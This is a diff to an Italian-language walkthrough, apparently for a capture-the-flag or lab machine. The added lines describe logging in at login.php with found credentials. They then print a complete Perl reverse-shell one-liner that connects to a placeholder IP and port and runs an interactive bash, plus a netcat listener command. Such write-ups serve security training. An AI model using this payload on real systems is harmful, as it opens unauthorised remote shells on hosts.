@@ -20,4 +20,9 @@ _________________
 
  ![Istantanea_2023-08-05_17-21-44](https://github.com/Manganaccio/Manganaccio/assets/137283468/c2bbae57-8946-44ad-93c0-74a3f1ac815f)
 
-- visitando la pgina login.php si potrà effettuare l'accesso con le credenziali trovate, si verrà poi indirizzati ad una nuova pagina web dove è presente una 
+- visitando la pgina login.php si potrà effettuare l'accesso con le credenziali trovate. Si verrà poi indirizzati ad una nuova pagina web dove si potrà eseguire il comando per ottenere la reverse shell:
+  perl -e 'use Socket;$i="YOUR-IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
+- in un terminale eseguire il comando: nc -lvnp PORT (la porta da selezionare dovrà essere la medesima inserita nel comando "perl")
+
+![Istantanea_2023-08-06_09-36-42](https://github.com/Manganaccio/Manganaccio/assets/137283468/74752716-7fb8-40b7-ad59-877b42e927dd)
+
